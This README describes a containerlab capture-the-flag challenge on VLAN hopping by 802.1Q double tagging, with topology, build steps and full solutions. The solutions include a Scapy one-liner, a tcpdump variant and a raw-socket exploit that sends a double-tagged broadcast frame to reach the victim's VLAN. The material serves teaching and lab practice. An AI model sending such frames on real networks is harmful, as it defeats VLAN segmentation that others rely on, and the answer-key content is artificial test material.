# Double Tagging (VLAN Hopping)

This challenge is built for the cftd containerlab. The attacker is on VLAN 10,
the victim is on VLAN 20, and the router between them drops anything that crosses
directly from one VLAN to the other. The way in is a single frame with two 802.1Q
tags. switch1 throws the outer tag away and forwards the frame with the inner tag
still on, so it arrives on VLAN 20 next to the victim. The victim replies over
UDP with the flag, and the router passes that reply on its way back to VLAN 10.

## Topology

```
attacker --- [switch1] ===== trunk ===== [switch2] --- victim
  VLAN 10       |     native 10, tagged 20     |      VLAN 20
                |                              |
                +---------- [router] ----------+
                  192.168.0.1/24    192.168.20.1/24
```

The attacker's port on switch1 is an access port in VLAN 10, and the victim's
port on switch2 is an access port in VLAN 20. The trunk between the switches
carries VLAN 10 untagged (native) and VLAN 20 tagged. The router has one leg in
each VLAN, which is how the reply gets back.

| Link | VLANs |
|------|-------|
| `attacker-client:eth1` to `switch1:eth1` | access, VLAN 10 untagged |
| `switch1:eth2` to `switch2:eth1` | trunk, VLAN 10 untagged (native), VLAN 20 tagged |
| `switch2:eth2` to `victim-client:eth1` | access, VLAN 20 untagged |
| `router:eth1` to `switch1:eth3` | access, VLAN 10 untagged |
| `router:eth2` to `switch2:eth3` | access, VLAN 20 untagged |

| Node | Address | Notes |
|------|---------|-------|
| `attacker-client` | `192.168.0.137/24` | Kali template image, SSH on host port `2222` |
| `router:eth1` | `192.168.0.1/24` | VLAN 10 gateway |
| `router:eth2` | `192.168.20.1/24` | VLAN 20 gateway |
| `victim-client` | `192.168.20.10/24` | UDP `1337`, sends back `/flag.txt` |

## The attack

The router forwards in one direction only:

```bash
iptables -P FORWARD DROP
iptables -A FORWARD -i eth2 -o eth1 -j ACCEPT   # VLAN 20 -> VLAN 10
```

A plain packet from `192.168.0.137` to `192.168.20.10` is dropped, but a reply
from the victim to the attacker is allowed through. The exploit makes the victim
generate that reply:

1. The attacker sends `Ether | 802.1Q(10) | 802.1Q(20) | IP | UDP`.
2. switch1 accepts the frame on the VLAN 10 access port. The trunk port strips
   the outer tag on the way out, so the frame leaves with only the VLAN 20 tag.
3. switch2 sees a tagged VLAN 20 frame on the trunk and sends it out the victim's
   access port untagged.
4. The victim answers to the attacker's IP and port. That packet takes the normal
   routed path from VLAN 20 back to VLAN 10 and reaches the attacker with no tags
   at all.

The attacker has no way to ARP inside VLAN 20, so the frame is sent to the
broadcast MAC address. Linux still delivers a UDP datagram with a unicast
destination IP when the L2 destination is broadcast, which is what makes this
work.

## Files

| Path | Purpose |
|------|---------|
| `double-tagging.clab.yaml` | Containerlab topology (5 nodes, 5 veth links) |
| `challenge.containerfile` | Wraps the topology into the challenge image |
| `build.sh` | Builds/pushes the roles, then the challenge image |
| `config.json` | Registry credentials for the build-time image pre-pull |
| `switch/` | Alpine + iproute2, one image driven by `SWITCH_ROLE=1/2` |
| `router/` | Alpine + iproute2 + iptables, inter-VLAN routing and firewall |
| `victim-client/` | Alpine + python3, the UDP flag service |
| `solution/double_tag.py` | Reference exploit, raw sockets, no Scapy |
| `solution/scapy-one-liner.txt` | The same exploit as one console line |

## Building

`config.json` holds your registry login. Run `printf 'user:password' | base64`
and put the result in the `auth` field. Then replace `registry.example.com` in
`build.sh`, `double-tagging.clab.yaml` and `config.json`, and point
`registry.example.com/templates/kali:v1` at your own Kali image (it needs to run
sshd).

Build on an amd64 host with the Sysbox runtime registered:

```bash
./build.sh
```

## Solving
Note: The victim answers every packet on port 1337. Payload below is just examples.

Deploy the image through your platform, then ssh into the attacker:

```bash
ssh -p 2222 <SSH_USER>@<challenge-host>
```

`solution/double_tag.py` is a self-contained reference. Copy it into the
container and run it as root:

```bash
sudo python3 double_tag.py
```

It reads the MAC address of eth1, builds the frame with `struct`, sends it over
an `AF_PACKET` socket and waits on UDP 4444 for the answer:

```
[*] attempt 1: sending double-tagged frame on eth1 (outer=10, inner=20)
[+] reply from 192.168.20.10:1337: FLAG{...}
```

### Scapy, without writing a script

Scapy is already installed on Kali, so a student can open the console with
`sudo scapy` and paste one line (it is also in `solution/scapy-one-liner.txt`):

```python
sniff(iface="eth1", filter="udp and dst port 4444", count=1, timeout=5, prn=lambda p: p[UDP].payload.load, started_callback=lambda: sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(src="192.168.0.137",dst="192.168.20.10")/UDP(sport=4444,dport=1337)/b"flag?", iface="eth1"))
```

```
Sent 1 packets.
b'FLAG{...}\n'
```

### Two terminals with tcpdump

If the lambda is a lot for a beginner, let tcpdump do the watching. In one
terminal:

```bash
sudo tcpdump -i eth1 -n -A udp port 4444
```

In the other, only send the frame from Scapy:

```
>>> sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(src="192.168.0.137",dst="192.168.20.10")/UDP(sport=4444,dport=1337)/b"flag?", iface="eth1")
```

tcpdump prints the reply in clear text:

```
IP 192.168.20.10.1337 > 192.168.0.137.4444: UDP, length 38
E..B..@.?......
.....9.\....FLAG{...}
```

